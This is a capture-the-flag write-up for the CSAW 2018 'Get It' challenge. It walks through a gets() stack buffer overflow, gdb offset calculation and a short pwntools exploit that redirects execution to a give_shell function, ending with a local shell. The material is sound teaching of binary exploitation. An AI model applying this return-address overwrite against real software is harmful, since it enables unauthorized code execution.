---
search:
  exclude: true
---
# CSAW 2018 Get It

## Downloading the binary file 
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [binexp/2/getit]
    → wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/05-bof_callfunction/csaw18_getit/get_it
    --2021-02-27 14:55:14--  https://github.com/guyinatuxedo/nightmare/raw/master/modules/05-bof_callfunction/csaw18_getit/get_it
    Resolving github.com (github.com)... 140.82.121.3
    Connecting to github.com (github.com)|140.82.121.3|:443... connected.
    HTTP request sent, awaiting response... 302 Found
    Location: https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/05-bof_callfunction/csaw18_getit/get_it [following]
    --2021-02-27 14:55:15--  https://raw.githubusercontent.com/guyinatuxedo/nightmare/master/modules/05-bof_callfunction/csaw18_getit/get_it
    Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.109.133, ...
    Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 8744 (8.5K) [application/octet-stream]
    Saving to: ‘get_it’
    
    get_it                                                                          100%[=======================================================================================================================================================================================================>]   8.54K  --.-KB/s    in 0s
    
    2021-02-27 14:55:15 (36.0 MB/s) - ‘get_it’ saved [8744/8744]
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [binexp/2/getit]
    → file get_it
    get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [binexp/2/getit]
    → chmod +x get_it
    

` ![]()

## Solution 

first we start by executing the binary to see what it does:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [binexp/2/get]
    → ./get_it
    Do you gets it??
    maybe
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [binexp/2/get]
    → ./get_it
    Do you gets it??
    yes
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [binexp/2/get]
    → pwn checksec get_it
    [*] '/home/nothing/binexp/2/get/get_it'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    

It prints text, and then asks for our input. This is a 64 bit binary with a non-executable stack. Let's check it from inside ghidra:

![](16.png)

The binary really has a simplistic code for the main function:
    
    
    undefined8 main(void)
    
    {
      char local_28 [32];
      
      puts("Do you gets it??");
      gets(local_28);
      return 0;
    }
    
    

So our input text is given to the local_28 variable which can hold 32 characters, and it is being passed through a gets function, and as we saw in the previous binary, the gets function is not secure because it does not know a limit, there is no size restriction for the data that gets scanned in, it will simply scan in data until it gets either a newline character or an EOF. Because of this we can write more data to our input text variable (local_28) than it can hold.

Looking at the other functions of this binary, we see that there is another function that's there to spawn a shell for us:

![](17.png)
    
    
    void give_shell(void)
    
    {
      system("/bin/bash");
      return;
    }
    

From here it's safe to assume that the goal is to find a way to spawn a shell thanks to the give_shell function. Since we know the gets function does not have an upper limit, so our goal is to overwrite the return function at the end, so that we can do what we want with it: 
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/2 ] [binexp/2/get]
    → gdb ./get_it
    GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
    Copyright (C) 2021 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later 
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    .
    Find the GDB manual and other documentation resources online at:
        .
    
    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    GEF for linux ready, type `gef' to start, `gef config' to configure
    92 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
    Reading symbols from ./get_it...
    (No debugging symbols found in ./get_it)
    gef➤  disas main
    Dump of assembler code for function main:
       0x00000000004005c7 <+0>:     push   rbp
       0x00000000004005c8 <+1>:     mov    rbp,rsp
       0x00000000004005cb <+4>:     sub    rsp,0x30
       0x00000000004005cf <+8>:     mov    DWORD PTR [rbp-0x24],edi
       0x00000000004005d2 <+11>:    mov    QWORD PTR [rbp-0x30],rsi
       0x00000000004005d6 <+15>:    mov    edi,0x40068e
       0x00000000004005db <+20>:    call   0x400470 
       0x00000000004005e0 <+25>:    lea    rax,[rbp-0x20]
       0x00000000004005e4 <+29>:    mov    rdi,rax
       0x00000000004005e7 <+32>:    mov    eax,0x0
       0x00000000004005ec <+37>:    call   0x4004a0 
       0x00000000004005f1 <+42>:    mov    eax,0x0
       0x00000000004005f6 <+47>:    leave
       0x00000000004005f7 <+48>:    ret
    End of assembler dump.
    gef➤  b *0x4005f1
    Breakpoint 1 at 0x4005f1
    gef➤  r
    

Here we set our first breakpoint right after the gets call, so let's run the binary and give it a pattern easy to remember:
    
    
    
    gef➤  r
    Starting program: /home/nothing/binexp/2/get/get_it
    Do you gets it??
    13371337
    
    Breakpoint 1, 0x00000000004005f1 in main ()
    [ Legend: Modified register | Code | Heap | Stack | String ]
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
    $rax   : 0x00007fffffffe0e0  →  "13371337"
    $rbx   : 0x0
    $rcx   : 0x00007ffff7fac980  →  0x00000000fbad2288
    $rdx   : 0x0
    $rsp   : 0x00007fffffffe0d0  →  0x00007fffffffe1f8  →  0x00007fffffffe4de  →  "/home/nothing/binexp/2/get/get_it"
    $rbp   : 0x00007fffffffe100  →  0x0000000000400600  →  <__libc_csu_init+0> push r15
    $rsi   : 0x31373333
    $rdi   : 0x00007ffff7faf680  →  0x0000000000000000
    $rip   : 0x00000000004005f1  →   mov eax, 0x0
    $r8    : 0x00007fffffffe0e0  →  "13371337"
    $r9    : 0x0
    $r10   : 0x6e
    $r11   : 0x246
    $r12   : 0x00000000004004c0  →  <_start+0> xor ebp, ebp
    $r13   : 0x0
    $r14   : 0x0
    $r15   : 0x0
    $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
    0x00007fffffffe0d0│+0x0000: 0x00007fffffffe1f8  →  0x00007fffffffe4de  →  "/home/nothing/binexp/2/get/get_it"    ← $rsp
    0x00007fffffffe0d8│+0x0008: 0x0000000100000000
    0x00007fffffffe0e0│+0x0010: "13371337"   ← $rax, $r8
    0x00007fffffffe0e8│+0x0018: 0x0000000000400400  →   add BYTE PTR [rax], al
    0x00007fffffffe0f0│+0x0020: 0x00007fffffffe1f0  →  0x0000000000000001
    0x00007fffffffe0f8│+0x0028: 0x0000000000000000
    0x00007fffffffe100│+0x0030: 0x0000000000400600  →  <__libc_csu_init+0> push r15  ← $rbp
    0x00007fffffffe108│+0x0038: 0x00007ffff7e14d0a  →  <__libc_start_main+234> mov edi, eax
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
         0x4005e4         mov    rdi, rax
         0x4005e7         mov    eax, 0x0
         0x4005ec         call   0x4004a0 
    ●→   0x4005f1         mov    eax, 0x0
         0x4005f6         leave
         0x4005f7         ret
         0x4005f8                  nop    DWORD PTR [rax+rax*1+0x0]
         0x400600 <__libc_csu_init+0> push   r15
         0x400602 <__libc_csu_init+2> push   r14
    ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
    [#0] Id 1, Name: "get_it", stopped 0x4005f1 in main (), reason: BREAKPOINT
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
    [#0] 0x4005f1 → main()
    ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    

no need to search for the pattern, we see that our pattern appears at $rax ( 0x00007fffffffe0e0 )
    
    
    gef➤  i f
    Stack level 0, frame at 0x7fffffffe110:
     rip = 0x4005f1 in main; saved rip = 0x7ffff7e14d0a
     Arglist at 0x7fffffffe100, args:
     Locals at 0x7fffffffe100, Previous frame's sp is 0x7fffffffe110
     Saved registers:
      rbp at 0x7fffffffe100, rip at 0x7fffffffe108
    
    

here we see that the return address is stored at 0x7fffffffe108, lets verify that our pattern is at the address we found above: 
    
    
    gef➤  search-pattern 13371337
    [+] Searching '13371337' in memory
    [+] In '[heap]'(0x602000-0x623000), permission=rw-
      0x6026b0 - 0x6026ba  →   "13371337\n"
    [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
      0x7fffffffe0e0 - 0x7fffffffe0e8  →   "13371337"
    

and it is! now we need to calculate the offset between 0x00007fffffffe0e0 and 0x7fffffffe108 
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/get]
    → python3
    Python 3.9.1+ (default, Feb  5 2021, 13:46:56)
    [GCC 10.2.1 20210110] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> hex( 0x7fffffffe0e0  -  0x7fffffffe108 )
    '-0x28'
    

So we get a 0x28 byte offset which is 40 bytes in decimal, basically we need to write 40 bytes worth of input, and then we can write over the return address. Tis address will be executed when the ret instruction is executed, which will give us code execution. We need the address of the give_shell function which we get from ghidra:
    
    
                                 **************************************************************
                                 *                          FUNCTION                          *
                                 **************************************************************
                                 undefined give_shell()
                 undefined         AL:1           
                                 give_shell                                      XREF[3]:     Entry Point(*), 004006bc, 
                                                                                              00400758(*)  
            004005b6 55              PUSH       RBP
    
    

now that we know that we need 40 bytes of input, and then the address 0x004005b6, we can create our payload:
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/get]
    → vim exploit.py
    
    
    
    
    from pwn import *
    import sys
    
    target = process("./get_it")
    
    payload =  b""
    payload += b"\x00" * 0x28
    payload += p64(0x4005b6)
    
    
    target.sendline(payload)
    
    target.interactive()
    
    
    

Basically with this exploit.py we create a payload that has 40 nullbytes (0x28 in hexa) and then contains the address of the give_shell function, so let's see if it works: 
    
    
    [ 192.168.100.126/24 ] [ /dev/pts/1 ] [binexp/2/get]
    → python3 exploit.py
    [+] Starting local process './get_it': pid 244402
    [*] Switching to interactive mode
    Do you gets it??
    $ w
     21:07:19 up 1 day, 22:20,  3 users,  load average: 0.16, 0.14, 0.06
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    nothing  pts/1    tmux(6724).%3    16:42    6.00s 18.38s  0.15s python3 exploit.py
    nothing  pts/3    tmux(6724).%4    19:14   45:07   0.88s  0.04s less
    nothing  pts/4    tmux(6724).%5    19:21    3:35   2.46s  2.46s -zsh
    
    

and that's it! we have been able to spawn a shell with the binary file.

## Title 

text 
    
    
    

` ![]()

## Title 

text 
    
    
    

` ![]()

